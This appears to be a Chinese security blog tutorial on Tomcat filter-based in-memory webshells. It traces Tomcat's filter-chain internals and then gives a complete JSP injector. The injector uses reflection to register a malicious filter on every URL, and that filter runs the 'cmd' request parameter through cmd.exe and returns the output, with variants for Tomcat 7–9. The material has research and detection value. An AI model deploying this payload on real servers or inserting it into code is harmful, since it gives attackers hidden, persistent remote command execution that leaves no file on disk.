---
created: '22/02/16'
title: Tomcat-Filter型内存马
tags:
  - java
  - java安全
  - 内存马
---
# Tomcat-Filter型内存马

## 参考文章
- http://wjlshare.com/archives/1529

## Tomcat-Filter
filter顾名思义就是过滤器的意思，在tomca中我们可以通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220216173834.png)
我们的请求会在经过Servlet之前先经过filter，那么如果我们动态创建一个filter并将其放在最前面，并在这个filter中放入恶意代码，当我们访问Servlet的时候就能成功执行我们的恶意代码，这也是所谓的内存webshell(因为filter是动态创建的，没有文件落地)，那么要如何动态地创建一个filter呢？

## Filter流程分析
我们先来了解一下在Tomcat中与Filter密切相关的几个类:
- FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息
- FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息
- FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern
- FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter
- WebXml：存放 web.xml 中内容的类
- ContextConfig：Web应用的上下文配置类
- StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper
- StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet

然后我们编写一个DemoFilter来做测试:
```java
package top.longlone.filter;

import javax.servlet.*;
import java.io.IOException;

public class DemoFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("filter init");
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        System.out.println("do filter");
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {

    }
}
```
配置好对应的web.xml:
```xml
  <filter>
    <filter-name>DemoFilter</filter-name>
    <filter-class>top.longlone.filter.DemoFilter</filter-class>
  </filter>

  <filter-mapping>
    <filter-name>DemoFilter</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
```
接下来在`doFilter()`方法打下断点，运行tomcat服务器并访问:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217104758.png)
查看调用栈，跟进`StandardWrapperVavle.invoke()`方法:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217104858.png)
发现他是根据filterChain来去做filter的，根据搜索找到filterChain的定义位置:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217104949.png)
重新下断点到这个位置，跟进`ApplicationFilterFactory.createFilterChain()`方法，分析该方法，发现其先会会调用 `getParent()` 方法获取`StandardContext`，再获取filterMaps:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217105248.png)
filterMaps中的 filterMap 主要存放了过滤器的名字以及作用的 url:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217105332.png)
接下来会遍历filterMaps 中的 filterMap，如果发现符合当前请求 url 与 filterMap 中的 urlPattern 匹配且通过filterName能找到对应的filterConfig，则会将其加入filterChain:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217105551.png)
查看filterConfig的结构，里面主要包含了filter名，filter和filterDef:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217105911.png)
至此filterChain组装完毕，重新回到 StandardContextValue 中，后面会调用 `filterChain.doFilter()` 方法:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217110138.png)
跟进 `filterChain.doFilter()` 方法，其会调用`internalDoFilter()`方法:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217110558.png)
会从filters中依次拿到filter和filterConfig，最终调用`filter.doFilter()`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217110841.png)

引用一张经典图片来描述filter的工作原理:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220216175207.png)



## 内存马实现流程分析
根据上面的调试，我们发现最关键的就是`StandardContext.findFilterMaps()`和`StandardContext.findFilterConfig()`，我们可以来看看这2个方法的实现，可以看到都是直接从StandardContext中取到对应的属性，那么我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现动态添加filter的目的:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217112015.png)
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217112027.png)

实际上StandardContext也有一些方法可以帮助我们添加属性。首先我们来看filtermaps，StandardContext直接提供了对应的添加方法(Before是将filter放在首位，正是我们需要的)，这里再往filterMaps添加之前会有一个校验filtermap是否合法的操作，跟进`validateFilterMap()`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217112920.png)
可以看到这里有一个坑点，它会根据filterName去寻找对应的filterDef，如果没找到的话会直接抛出异常，也就是说我们还需要往filterDefs里添加filterDef。
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217112417.png)

那么我们接下来再看filterDefs，StandardContext直接提供了对应的添加方法:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217112602.png)

最后我们再来看filterConfigs，根据命名规则搜索`addFilterConfig`，发现并没有这个方法，所以我们考虑要通过反射的方法手动获取属性并添加:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217112715.png)
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220217112750.png)

最后总结下Filter型内存马(即动态创建filter)的步骤:
1. 获取StandardContext
2. 继承并编写一个恶意filter
3. 实例化一个FilterDef类，包装filter并存放到StandardContext.filterDefs中
4. 实例化一个FilterMap类，将我们的 Filter 和 urlpattern 相对应，存放到StandardContext.filterMaps中(一般会放在首位)
5. 通过反射获取filterConfigs，实例化一个FilterConfig(ApplicationFilterConfig)类，传入StandardContext与filterDefs，存放到filterConfig中

以下是代码的具体实现:
```
<!-- tomcat 8 -->
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<%
    String name = "Longlone";
    // 获取StandardContext
    ServletContext servletContext = request.getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    // 获取filterConfigs
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null) {
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null) {
                    byte[] bytes = new byte[1024];
                    Process process = new ProcessBuilder("cmd.exe", "/C", req.getParameter("cmd")).start();
                    int len = process.getInputStream().read(bytes);
                    servletResponse.getWriter().write(new String(bytes, 0, len));
                    process.destroy();
                    return;
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {

            }

        };

        // FilterDef
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);

        // FilterMap
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);

        //ApplicationFilterConfig
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
        filterConfigs.put(name, filterConfig);
    
        out.print("Inject Success !");

    }
%>
```

## 注意事项
这种注入filter内存马的方法只支持 Tomcat 7.x 以上，因为 javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3
```java
  filterMap.setDispatcher(DispatcherType.REQUEST.name());
```

另外在tomcat不同版本需要通过不同的库引入FilterMap和FilterDef
```
<!-- tomcat 7 -->
<%@ page import = "org.apache.catalina.deploy.FilterMap" %>
<%@ page import = "org.apache.catalina.deploy.FilterDef" %>
```

```
<!-- tomcat 8/9 -->
<%@ page import = "org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import = "org.apache.tomcat.util.descriptor.web.FilterDef"  %>
```